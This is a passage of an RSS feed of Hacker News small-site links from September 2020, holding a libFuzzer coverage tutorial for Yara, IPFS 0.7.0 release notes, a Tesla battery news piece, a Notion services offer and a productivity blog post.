        <span>sub</span> <span>par</span>( \<span>x</span> ) { <span>Par</span>[<span>x</span>].<span>new</span> }
        <span>sub</span> <span>const</span>( <span>$x</span> ) { <span>Const</span>[<span>$x</span>].<span>new</span> }
        <span>sub</span> <span>pow</span>( \<span>t</span>, <span>$m</span> ) { <span>Pow</span>[ <span>t</span>, <span>$m</span>].<span>new</span> } </code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/">https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/</a></em></p>]]>
            </description>
            <link>https://wimvanderbauwhede.github.io/articles/universal-interpreter-part-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579253</guid>
            <pubDate>Thu, 24 Sep 2020 15:01:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to integrate a fuzzer with your project?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579207">thread link</a>) | @fcambus
<br/>
September 24, 2020 | https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Generally, during fuzz testing (regardless of the tool used to perform it:
American Fuzzy Lop, libFuzzer, or any other), we have to remember
to keep the number of iterations per second high.
This means that a good fuzzer is a fast fuzzer.</p>

<p>This is mostly facilitated by minimizing the structures and operations
needed to prepare the context. We do not reinitialize the mechanisms
of the fuzzed library for every iteration. We use the stack instead of the heap
and globals.
For example, according to
<a href="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Modern_Fuzzing_of_C_CPP_Projects.pdf">Max Moroz‚Äôs fuzzing tutorial</a>,
slide 62, handling 1 MB of
memory on the heap slows down the fuzzer two times, compared to a buffer
of the same size on the stack. A second example from the same tutorial
is the use of <code>memset(3)</code>
function for buffers on the heap that causes the fuzzer performance degradation
up to five times.
Reducing the size of buffers used temporarily is also worth considering.
Allocating a 256 kB buffer on the stack takes three times less time
compared to a 1 MB allocation.
The last ‚Äútrick‚Äù is to use global variables instead of local. The observed
efficiency gain from using this method is about two times.
Our experience shows that this is paid for with a slightly higher memory usage
at the start.</p>

<p>On the other hand, it is essential to remember to
release all the resources used during a fuzzer iteration - this ensures
that the tested program does not consume all the system memory.</p>

<p>Tuning the fuzzer usually gives measurable effects, but under certain
circumstances we will hit a performance barrier. Despite following the best
practices, we will not achieve a significant improvement of the iteration
rate. This is especially true for parsers of binary formats such as executables
or multimedia files. Fast fuzzing targets include regular expression engines,
network stacks, and text formats.</p>



<p>Both AFL++ and libFuzzer use SanitizerCoverage as the default code coverage
testing tool. A built-in LLVM tool can be used to generate reports telling us
what part of the code is being reached by our test corpora.</p>

<p>We are going to show how to work with SanitizerCoverage,
libFuzzer and the <a href="https://github.com/VirusTotal/yara">Yara project</a> example.
Yara is a tool used by malware researchers
and helps to detect and analyse malicious code. Yara is designed around
textual and binary patterns and integrates well with the libFuzzer project.</p>

<p>In order to instrument Yara with necessary code coverage, perform the following
steps:</p>

<pre><code>git clone https://github.com/Moritz-Systems/libfuzzer-coverage-yara
cd libfuzzer-coverage-yara/yara-codecov

./bootstrap.sh

CC=clang CXX=clang++ \
  CFLAGS="-g -O1 -fsanitize=fuzzer-no-link -fprofile-instr-generate \
  -fcoverage-mapping" \
  ./configure

CC=clang CXX=clang++ \
  CFLAGS="-g -O1 -fsanitize=address,fuzzer-no-link \
  -fprofile-instr-generate -fcoverage-mapping" \
  make -j4

libtool --mode=compile --tag=CXX clang++ \
  -fsanitize=address,fuzzer -fprofile-instr-generate \
  -fcoverage-mapping -std=c++11 -I./libyara/include/ \
  -pthread -o yara_rules_lfuzzer_cov.o -c \
  tests/oss-fuzz/rules_fuzzer.cc

libtool --mode=link --tag=CXX clang++ \
  -fsanitize=address,fuzzer -fprofile-instr-generate \
  -fcoverage-mapping \
  -lcrypto -lssl -pthread \
  yara_rules_lfuzzer_cov.o libyara/libyara.la \
  -o yara_rules_lfuzzer_cov
</code></pre>

<p>We have to run the fuzzer together with additional switches and variables:</p>

<pre><code>LLVM_PROFILE_FILE="yara.profraw" \
  libtool --mode=execute \
  ./yara_rules_lfuzzer_cov -runs=1 ../yara-fuzzing-corpus
INFO: Seed: 3494707497
INFO: Loaded 2 modules   (10070 inline 8-bit counters): 10063 [0x7f3b18be361f, 0x7f3b18be5d6e), 7 [0x5ad045, 0x5ad04c),
INFO: Loaded 2 PC tables (10070 PCs): 10063 [0x7f3b18be5d70,0x7f3b18c0d260), 7 [0x56f4b0,0x56f520),
INFO:     1115 files found in ../yara-fuzzing-corpus/
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 19232 bytes
INFO: seed corpus: files: 1115 min: 4b max: 19232b total: 1797733b rss: 36Mb
#1024   pulse  cov: 2719 ft: 10489 corp: 735/695Kb exec/s: 341 rss: 264Mb
#1117   INITED cov: 2738 ft: 10987 corp: 781/1017Kb exec/s: 372 rss: 264Mb
#1117   DONE   cov: 2738 ft: 10987 corp: 781/1017Kb lim: 19232 exec/s: 372 rss: 264Mb
Done 1117 runs in 3 second(s)
</code></pre>

<p>The result is a file with the .profraw extension, which must be indexed before
generating coverage report with the command:</p>

<pre><code>llvm-profdata merge -sparse yara.profraw -o yara.profdata
</code></pre>

<p>The result of the last operation is a file that can be passed to the
SanitizerCoverage report generator (of course you can debug your
harness with coverage!):</p>

<pre><code>llvm-cov show ./yara_rules_lfuzzer_cov.o -instr-profile=yara.profdata
&lt;snipped&gt;                                                  
   30|       |#include &lt;stdint.h&gt;
   31|       |#include &lt;stddef.h&gt;
   32|       |#include &lt;string.h&gt;
   33|       |
   34|       |#include &lt;yara.h&gt;
   35|       |
   36|       |
   37|       |extern "C" int LLVMFuzzerInitialize(int* argc, char*** argv)
   38|      1|{
   39|      1|   yr_initialize();
   40|      1|  return 0;
   41|      1|}
   42|       |
   43|       |
   44|       |extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
   45|  1.11k|{
   46|  1.11k|  YR_RULES* rules;
   47|  1.11k|  YR_COMPILER* compiler;
   48|  1.11k|
   49|  1.11k|  char* buffer = (char*) malloc(size + 1);
   50|  1.11k|
   51|  1.11k|  if (!buffer)
   52|      0|    return 0;
   53|  1.11k|
   54|  1.11k|  strncpy(buffer, (const char *) data, size);
   55|  1.11k|  buffer[size] = 0;
   56|  1.11k|
   57|  1.11k|  if (yr_compiler_create(&amp;compiler) != ERROR_SUCCESS)
   58|  1.11k|  {
   59|      0|    free(buffer);
   60|      0|    return 0;
   61|      0|  }
   62|  1.11k|
   63|  1.11k|  if (yr_compiler_add_string(compiler, (const char*) buffer, NULL) == 0)
   64|    119|  {
   65|    119|    if (yr_compiler_get_rules(compiler, &amp;rules) == ERROR_SUCCESS)
   66|    119|      yr_rules_destroy(rules);
   67|    119|  }
   68|  1.11k|
   69|  1.11k|  yr_compiler_destroy(compiler);
   70|  1.11k|  free(buffer);
   71|  1.11k|
   72|  1.11k|  return 0;
   73|  1.11k|}
</code></pre>

<p>The amount of executions of the specified functions in our harness for the prepared corpora.</p>

<p>Additionally, you can print a summary of coverage data for modules or for individual files:</p>

<pre><code>llvm-cov report ./libyara/hex_grammar.o -instr-profile=foo.profdata
Filename                      Regions    Missed Regions     Cover   Functions  Missed Functions  Executed       Lines      Missed Lines     Cover
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
hex_grammar.c                     489               120    75.46%           4                 0   100.00%         961               165    82.83%
 
Files which contain no functions:
include/yara/hex_lexer.h            0                 0         -           0                 0         -           0                 0         -
include/yara/limits.h               0                 0         -           0                 0         -           0                 0         -
include/yara/re.h                   0                 0         -           0                 0         -           0                 0         -
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
TOTAL                             489               120    75.46%           4                 0   100.00%         961               165    82.83%
</code></pre>



<p>It is worth mentioning that many open-source projects have a variety of test
corpora, sometimes even including file formats no longer in broad use.
Additionally, unit tests provide a very good source of test cases. After
writing a proper parser, they can significantly improve code coverage.
Searching for the file extension with Google also brings very good results.</p>

<p>If the project does not provide tests or corpora, the only remaining option is
to generate a useful set of files manually: in the case of text formats, it is
easy to find relevant information in the code and use it in your files.
Binary files can often be obtained using conversion tools included in the project.
All you need to do is to find a file in a format supported by
the converter and script it to generate the output. Finally, I would like to remind you
once again to minimize the file sizes.</p>

<p>One of the key elements causing increased code coverage are
dictionaries - text files containing constants for a given file format. This
saves the CPU time that would otherwise be needed to perform the initial
validation of key elements of the tested format. Dictionaries from AFL
and libFuzzer are compatible with each other - the initial ‚Äúcorpora‚Äù of the
dictionaries can be found in
<a href="https://github.com/google/fuzzing/tree/master/dictionaries">https://github.com/google/fuzzing/tree/master/dictionaries</a>.</p>



<p>libFuzzer‚Äôs originator and Google employee, Kostya Serebryany, proposed to
extend the classic continuous integration approach to fuzzing. Due to the fact
that libFuzzer fuzzers are very similar to unit tests, and unit tests alone
are not able to saturate the security tests, this approach is worth considering
in the project testing cycle.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/testing_developing_fuzzing.svg" alt="Testing, Developing, Fuzzing"></p>

<p>Based on libFuzzer, Google launched in December 2016 an open-source project
fuzzing service called OSS-Fuzz. Each open-source project developer can apply
for testing their own application. The only requirement is to write your own
fuzzer and create a pull-request to the Google repository.</p>

<p>At the time of writing the article there were 25,000 VMs available for OSS-Fuzz.
From its start, the project helped to find more than 11,000 different problems in the
following projects: OpenSSL, ffmpeg, LibreOffice, sqlite3 and freetype2.</p>

<p>Integrating an efficient fuzzer into your project has never been so easy and
cheap. In the era of (almost) cost-free computing power and easy access to cloud
servers, it is worthwhile to ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/">https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579207</guid>
            <pubDate>Thu, 24 Sep 2020 14:56:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Do Musical Scales Have Certain Numbers of Notes?]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579111">thread link</a>) | @lucaspauker
<br/>
September 24, 2020 | https://www.lucaspauker.ml/articles/16 | <a href="https://web.archive.org/web/*/https://www.lucaspauker.ml/articles/16">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lucaspauker.ml/articles/16</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579111</guid>
            <pubDate>Thu, 24 Sep 2020 14:48:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elon Musk Promises a Next-Gen Battery Equipped $25,000 Electric Car]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579050">thread link</a>) | @elorant
<br/>
September 24, 2020 | https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/ | <a href="https://web.archive.org/web/*/https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span>Tesla announced that it will considerably reduce the asking prices of its battery cells and packs, meaning, the company‚Äôs next goal is a $25,000 electric car.</span></p>
<p><span>It looks like Tesla will soon be coming with a new electric car carrying a $25,000 price tag. The company‚Äôs chief executive Elon Musk said its new ‚Äútabless‚Äù battery cells, and changing the materials used inside the cell, will enable the company to have the price per kilowatt-hour, which will enable them to make electric cars about the same price as combustion engine cars.</span></p>
<p><span>The kWh price per (kilowatt-hour) is the unit of energy, ideally used to measure the capacity packed by the battery inside modern electric vehicles. Those prices have been significantly declining over the last decade, from $1,100/kWh in 2010 to $156/kWh in 2019, a drop of 87 percent.</span></p>
<p><span>Experts suggest that the price is likely to hit $100/kWh by 2023, but Musk said Tesla will initiate a three-year process to bring the price below that, but did not reveal the exact price target. There is more to a battery than just its cell.</span></p>
<p><span>A lithium-ion battery cell that would normally cost you $100/kWh to produce mean a battery pack, with its additional components including cooling systems and battery management, could set you back $125‚Äì$130/kWh or more.</span></p>
<p><span>Today‚Äôs battery packs cost about $10,000‚Äì$12,000, based on their capacity. Reduced battery prices could pave the way for more affordable, higher volume electric cars. Tesla is bent on bringing the cost of future packs down to $6,000 or less, putting the cell cost under $100/kWh.</span></p>
<p><span>The average price of electric cars in the United States continues to drop ‚Äì from $64,300 in 2018 to $55,600 last year, a 13.4 percent decline. That‚Äôs primarily because of Tesla‚Äôs Model 3.</span></p>
<p><span>This is still high as compared to the average price of a gas-burning vehicle at $36,600. It is worth mentioning here that the price has been ticking upward recently.</span></p>
<p><span>The Model 3 was originally slated to be Tesla‚Äôs first car for the broader market. Tesla‚Äôs master plan from early on, as outlined by Musk in a <a href="https://www.tesla.com/blog/secret-tesla-motors-master-plan-just-between-you-and-me?redirect=no" target="_blank" rel="noopener noreferrer">blog post</a> in 2006, revolves around how it would build a highly appealing electric sports car in a bid to convince buyers that EVs can be cool too, use the revenue from there to bankroll a more affordable luxury sedan, and use the funds from the effort into building a car that people could buy without burning a hole in their pockets.</span></p>
<p><span>Due to Tesla‚Äôs well documented ‚Äúproduction hell,‚Äù Musk‚Äôs plan to build a $35,000 Model 3 did not come to fruition. The Model 3 Standard Range Plus starts at $37,990, the Performance starts at $54,990, and the Long Range starts at $46,990.</span></p>
<p><span>Musk first promised a $25,000 EV two years ago, which he said was possible within three years. ‚ÄúI think in order for us to get up to‚Ä¶a 25,000 car, that‚Äôs something we can do,‚Äù Musk said in an interview with YouTuber Marques Brownlee.</span></p>
<blockquote>
<p dir="ltr" lang="en">Musk: ‚ÄúLong-term we want to make about 20 million vehicles per year‚Äù</p>
<p>That‚Äôs roughly twice the production volume of Toyota, GM, or Volkswagen.</p>
<p>‚Äî E.W. Niedermeyer (@Tweetermeyer) <a href="https://twitter.com/Tweetermeyer/status/1308536403018440704?ref_src=twsrc%5Etfw">September 22, 2020</a></p></blockquote>

<p><span>‚ÄúBut if we work really hard I think maybe we can do that in about three years,‚Äù he explained. At <a href="https://plus.auczar.com/live-how-to-watch-tesla-battery-day-reveal-expect-big-surprises/" target="_blank" rel="noopener noreferrer">Battery Day</a> Musk made a new prediction hinting at 20 million cars a year, which roughly is twice the current production of Volkswagen, GM, or Toyota, author of Ludicrous: the Unvarnished Story of Tesla Motors Ed Niedermeyer tweeted.</span></p>
<p><iframe src="https://www.youtube.com/embed/MevKTPN4ozw" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<!-- AI CONTENT END 1 -->
</div></div>]]>
            </description>
            <link>https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579050</guid>
            <pubDate>Thu, 24 Sep 2020 14:42:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IPFS 0.7.0, the SECIO retirement edition]]>
            </title>
            <description>
<![CDATA[
Score 122 | Comments 44 (<a href="https://news.ycombinator.com/item?id=24578953">thread link</a>) | @georgyo
<br/>
September 24, 2020 | https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/ | <a href="https://web.archive.org/web/*/https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    


    <div>
      
      <p>by Jacob Heun &amp; Adin Schmahmann on 2020-09-24</p>

      

      

<p>In August we announced the <a href="https://blog.ipfs.io/2020-08-07-deprecating-secio/">deprecation of the SECIO security transport</a>. In this release we have disabled SECIO by default, which will have an impact on older nodes on the network. The best way to mitigate the impact of this change is to <a href="https://docs.ipfs.io/recent-releases/go-ipfs-0-7/update-procedure">upgrade your IPFS nodes</a> as soon as possible! Not only will upgrading ensure you‚Äôre using the latest security transports, you‚Äôll get access to all of the <a href="https://blog.ipfs.io/2020-07-20-dht-deep-dive/">performance improvements</a> we‚Äôve made this year to content routing.</p>

<p>With this release you will also start seeing more Peer IDs and IPNS Keys on the network that start with <code>1</code> instead of the typical <code>Qm</code>. This is due to a switch to ed25519 keys being used by default over RSA keys, which you can read more about in the highlights below.</p>

<p>üö® For those of you using plugins with IPFS there is a breaking change detailed below to the build process.</p>



<h2 id="secio-is-now-disabled-by-default">üîí SECIO is now disabled by default</h2>

<p>As part of deprecating and removing support for the SECIO security transport, we have disabled it by default. TLS1.3 will remain the default security transport with fallback to Noise. You can read more about the deprecation in the blog post, <a href="https://blog.ipfs.io/2020-08-07-deprecating-secio/">https://blog.ipfs.io/2020-08-07-deprecating-secio/</a>. If you‚Äôre running Go IPFS older than 0.5 or JS IPFS older than 0.47, this may start to impact your performance on the public network, so we strongly encourage you to upgrade today!</p>

<h2 id="ed25519-keys-are-now-used-by-default">üóùÔ∏è Ed25519 keys are now used by default</h2>

<p>Previously go-ipfs generated 2048 bit RSA keys for new nodes, but it will now use ed25519 keys by default. This will not affect any existing keys, but newly created keys will be ed25519 by default. The main benefit of using ed25519 keys over RSA is that ed25519 keys have an inline public key. This means that someone only needs your PeerId to verify things you‚Äôve signed, such as your Peer Records or in the future Signed Provider Records, which means we don‚Äôt have to worry about storing bulky RSA public keys.</p>

<h3 id="rotating-keys">Rotating keys</h3>

<p>Along with switching the default key type, we‚Äôve added support for rotating Identity keys. If you would like to change the key type of your IPFS node, you can now do so with the rotate command. <strong>NOTE: This will affect your Peer Id, so be sure you want to do this!</strong> Your existing identity key will be backed up in the Keystore so that it can still be referenced for things like IPNS records.</p>

<pre><code>$ ipfs key rotate -o my-old-key -t ed25519
</code></pre>

<h2 id="key-export-import">üì¶ Key export/import</h2>

<p>Speaking of backing up keys, we‚Äôve added commands to allow you to export and import keys from the IPFS Keystore to a local .key file. This does not currently apply to the IPFS identity key, <code>self</code>, which is housed in the configuration file.</p>

<pre><code>$ ipfs key gen mykey
$ ipfs key export -o mykey.key mykey # ./&lt;name&gt;.key is the default path
$ ipfs key import mykey mykey.key # on another node
</code></pre>

<h2 id="ipns-paths-now-encode-the-key-name-as-a-base36-cidv1-by-default">#Ô∏è‚É£ IPNS paths now encode the key name as a base36 CIDv1 by default</h2>

<p>Previously go-ipfs encoded the key names for IPNS paths as base58btc multihashes (e.g. <code>Qmabc...</code>). We now encode them as base36 encoded CIDv1s as defined in the <a href="https://github.com/libp2p/specs/blob/master/peer-ids/peer-ids.md#string-representation">peerID spec</a> (e.g. <code>k51xyz...</code>) which also deals with the encoding of public keys. This is nice because it means that IPNS keys will by default be case-insensitive and that they will fit into DNS labels (e.g. <code>k51xyz...ipns.localhost</code>) and therefore that subdomain gateway redirections (e.g. from <code>localhost:8080/ipns/{key}</code> to <code>{key}.ipns.localhost</code>) will look better to users in the default case.</p>

<p>Many commands will accept a <code>--ipns-base</code> option that allows changing command outputs to use a particular encoding (i.e.  base58btc multihash, or CIDv1 encoded in any supported base):</p>

<pre><code>$ ipfs key list -l --ipns-base b58mh
12D3KooWCjhz69LskTZEC5vFWs8eDpHo7kYbGzrC5EjU75BHSmVK self
$ ipfs key list -l --ipns-base base36
k51qzi5uqu5dh9ihj4p2v5sl3hxvv27ryx2w0xrsv6jmmqi91t9xp8p9kaipc2 self
</code></pre>

<h2 id="multiaddresses-now-accept-peerids-encoded-as-cidv1">üìÆ Multiaddresses now accept PeerIDs encoded as CIDv1</h2>

<p>In preparation for eventually changing the default PeerID representation multiaddresses can now contain strings like <code>/p2p/k51xyz...</code> in addition to the default <code>/p2p/Qmabc...</code>. There is a corresponding <code>--peerid-base</code> option to many functions that output peerIDs:</p>

<pre><code>$ ipfs id --format "&lt;id&gt;" --peerid-base b58mh
12D3KooWCjhz69LskTZEC5vFWs8eDpHo7kYbGzrC5EjU75BHSmVK
$ ipfs id --format "&lt;id&gt;" --peerid-base base36
k51qzi5uqu5dh9ihj4p2v5sl3hxvv27ryx2w0xrsv6jmmqi91t9xp8p9kaipc2
</code></pre>

<h2 id="dag-stat-command">üßÆ <code>dag stat</code> command</h2>

<p>Initial support has been added for the <code>ipfs dag stat</code> command. Running this command will traverse the DAG for the given root CID and report statistics. By default, progress will be shown as the DAG is traversed. Supported statistics currently include DAG size and number of blocks.</p>

<pre><code>$ ipfs dag stat bafybeihpetclqvwb4qnmumvcn7nh4pxrtugrlpw4jgjpqicdxsv7opdm6e # the IPFS webui
Size: 30362191, NumBlocks: 346
</code></pre>

<h2 id="plugin-build-changes">üö® Plugin build changes üö®</h2>

<p>We have changed the build flags used by the official binary distributions on <a href="https://dist.ipfs.io/">dist.ipfs.io</a> (or <code>/ipns/dist.ipfs.io</code>) to use the simpler and more reliable <code>-trimpath</code> flag instead of the more complicated and brittle <code>-asmflags=all=-trimpath="$(GOPATH)" -gcflags=all=-trimpath="$(GOPATH)"</code> flags, however the build flags used by default in go-ipfs remain the same.</p>

<p>The scripts in <a href="https://github.com/ipfs/go-ipfs-example-plugin">go-ipfs-example-plugin</a> have been updated to reflect this change. This is a <strong>breaking change</strong> to how people have been building plugins against the dist.ipfs.io binary of go-ipfs and plugins should update their build processes accordingly. See <a href="https://github.com/ipfs/go-ipfs-example-plugin/pull/9">go-ipfs-example-plugin/pull/9</a> for details.</p>

<h2 id="the-changelog">The Changelog</h2>

<p>For a full list of updates included in this release you can review the Changelog at <a href="https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#v070-2020-09-22">https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#v070-2020-09-22</a>.</p>

<h2 id="thank-you-contributors">Thank you contributors!</h2>

<p>A huge thank you to <a href="https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#contributors">everyone who contributed</a> patches and improvements in this release, all <strong>53</strong> of you! We couldn‚Äôt have made this happen without your help and feedback. ‚ù§</p>

<h2 id="install-upgrade-and-join-us">Install, upgrade, and join us!</h2>

<p>You can get started by <a href="https://dist.ipfs.io/#go-ipfs">installing go-ipfs</a> or <a href="https://docs.ipfs.io/recent-releases/go-ipfs-0-7/update-procedure">upgrading to go-ipfs 0.7</a>.</p>

<p>There are many ways to get involved with IPFS based on your skill set, interest, and availability.  Please check out <a href="https://github.com/ipfs/community/blob/master/CONTRIBUTING.md">our contribution page</a> on GitHub for guidance and next steps.</p>

<p>This is an exciting time for IPFS and the web in general. Join us!</p>


      
          
          
          
      
    </div>
  </div></div>]]>
            </description>
            <link>https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578953</guid>
            <pubDate>Thu, 24 Sep 2020 14:33:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Ready-Made CRM, Project and Content Management on Notion]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24578943">thread link</a>) | @saviorand
<br/>
September 24, 2020 | https://optemization.com/preconceived | <a href="https://web.archive.org/web/*/https://optemization.com/preconceived">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article id="/preconceived"><div id="/df2631fcf3ab4d74bfb32255cee6151d"><div id="/f3a8a7556e534222be5e49e6fb2c9ef6"><blockquote id="/7100cd2e553b454ab5102d49c9c9c48f"><span><span>Functional Notion workspaces take hours to create. To setup yourself and your team, you'd have to learn, ideate, build, iterate, and train. Let Optemization take care of this.

</span><span><strong>In two weeks flat.</strong></span></span></blockquote></div></div><h3><span id="/8dc73654f3b645b18006ee25d1bb0cfc"></span><span><span>üì¶ Components</span></span></h3><div id="/74c3d09ab64f4127abaeac25d78eed42"><div id="/a9f4c8f2706a40b19028c89ec97026e8"><p><span><span><strong>Foundational Databases</strong></span></span></p><p><span><span>‚Üí Eleven databases with properties and templates pre-built</span></span></p><ul><li id="/b56f8c313d22445ba331a9c56073cbed"><span><span>Project management suite with for task, calendar, project databases</span></span></li><li id="/7a82c37bf18a42cab68dadea85212342"><span><span>CRM suite with company, people, industry, geography databases</span></span></li><li id="/fd5f5c66de8f4986a9a784efdd6e8e39"><span><span>Resources suite with for content, topic databases</span></span></li><li id="/8ea94eb3df3c4ffa99ca78e24503cdfe"><span><span>Workspace hierarchy with three top-level pages</span></span></li><li id="/d44e005dffc84274af7dcf2f68ec130f"><span><span>Eleven database templates</span></span></li><li id="/e819d910acab47168608f868293a6a83"><span><span>$1000 credit</span></span></li><li id="/8cfdf53823ed4f6199f85397682457af"><span><span>1 hour onboarding meeting</span></span></li></ul></div></div><div id="/ce69d2f7689448ce8af6af68c6950bb9"><div id="/9987596c4d4e4e7099539209c83d70a7"><p><span><span><strong>Personalized Dashboards</strong></span></span></p><p><span><span>‚Üí Three customizable dashboards</span></span></p><ul><li id="/1bcf8781b59b47dbb85e426df06d2455"><span><span>Personal dashboard</span></span></li><li id="/b567781f9eb94096a4981739aa8bf700"><span><span>Vertical project dashboard</span></span></li><li id="/ea8517dbc1f34b49acc9333437539481"><span><span>Horizontal project dashboard</span></span></li><li id="/ecd1c7606e4c4229909eb2a4e5d786f5"><span><span>Dashboard component library</span></span></li><li id="/fe950994c03143f9b89b0f2adc7b44d0"><span><span>1 hour personalization meeting</span></span></li></ul></div></div><div id="/c43afe7bd97e4eb69e857db6c0b2abde"><div id="/d6f53f22277e4f6a9728ae71f6f03d77"><p><span><span><strong>Bonus Support</strong></span></span></p><ul><li id="/504337f059c94e02b38782626b35c482"><span><span>Shared Slack Connect channel</span><span><span>*</span></span></span></li><li id="/4b53e407064046d1b105399317f9e88c"><span><span>Curated Notion updates and content</span></span></li><li id="/fed65626c7414f0da78c7eeec6e5d222"><span><span>Discounts on future services and tools </span></span></li></ul><p><span><span>*Requires Standard Plan</span></span></p></div></div><h3><span id="/0b78decb95c24aa8b8771b3041080f4d"></span><span><span>üñ•Ô∏è Demo</span></span></h3><h3><span id="/56d6370823f34ff6bf3d2f2ddbfea3d5"></span><span><span>üìÜ Timeline</span></span></h3><p><span><span><strong>Six steps including two meetings (example dates).</strong></span></span></p><div id="/0de5b0f2af9944039b1a02342f8d0cd8"><div id="/5ea01ed9dfb244ae829b371d5c8a7ef9"><p><span><span><strong>üóøStart Installation</strong></span></span></p><p><span><span>üí¨</span><span><strong>Onboarding Meeting</strong></span></span></p><p><span><span>üì¶</span><span><strong>Ship Databases</strong></span></span></p><p><span><span>üí¨</span><span><strong>Customization Meeting</strong></span></span></p><p><span><span>üì¶</span><span><strong>Ship Dashboards</strong></span></span></p><p><span><span><strong>üóøCompletion Installation</strong></span></span></p></div><div id="/20f078e837764769ac3290a5f4ba6221"><p><span><span>Oct 5, 2020</span></span></p><p><span><span>Oct 5, 2020</span></span></p><p><span><span>Oct 12, 2020</span></span></p><p><span><span>Oct 12, 2020</span></span></p><p><span><span>Oct 19, 2020</span></span></p><p><span><span>Oct 19, 2020</span></span></p><p><span><span><strong>14 days</strong></span></span></p></div></div><h3><span id="/fdd2e4c53e3848a7ade37b394d8b9430"></span><span><span>üí≥ Pricing</span></span></h3><p><span><span><strong>$3,000. Split up as follows</strong></span></span></p><div id="/24038df326844c6693e5f7ecf3dcc093"><div id="/9ed4fc58aaec46cb9f76ca91e51408b5"><p><span><span>üßæ</span><span><strong>Deposit Payment</strong></span></span></p><p><span><span><strong>üì¶Add Credit</strong></span></span></p><p><span><span>üßæ</span><span><strong>Final Payment</strong></span></span></p></div></div><h3><span id="/6d214b8077b04c56a2b46d400dc03207"></span><span><span>üîí Checkout</span></span></h3><p><span><span><strong>You will not be charged immediately.</strong></span></span></p></article></div></div>]]>
            </description>
            <link>https://optemization.com/preconceived</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578943</guid>
            <pubDate>Thu, 24 Sep 2020 14:32:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Declare bankruptcy and don‚Äôt be ashamed of it]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24578858">thread link</a>) | @mcrittenden
<br/>
September 24, 2020 | https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-1461">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>I‚Äôm not talking about financial bankruptcy. I‚Äôm talking about all the other kinds of bankruptcy:</p>



<ul><li>Email bankruptcy (anything important will come back up)</li><li>Backlog bankruptcy (because <a href="https://critter.blog/2020/09/03/backlogs-are-not-idea-buckets/">Backlogs are not idea&nbsp;buckets</a>)</li><li>Books-to-read list bankruptcy (if your TBR list is 100+ books long, it‚Äôs not doing you any good)</li><li>Slack inbox bankruptcy (i.e., the first-day-back-from-vacation feeling)</li><li>Wiki bankruptcy (<a href="https://critter.blog/2020/08/10/wiki-bankruptcy/">I wrote about this one before</a>)</li><li>Social networking notification bankruptcy (this shouldn‚Äôt even be a question)</li><li>Browser tab bankruptcy (you can find stuff again when you to, but you won‚Äôt)</li><li>Garage/attic bankruptcy (don‚Äôt try to go through it, pay someone to haul it all away)</li></ul>



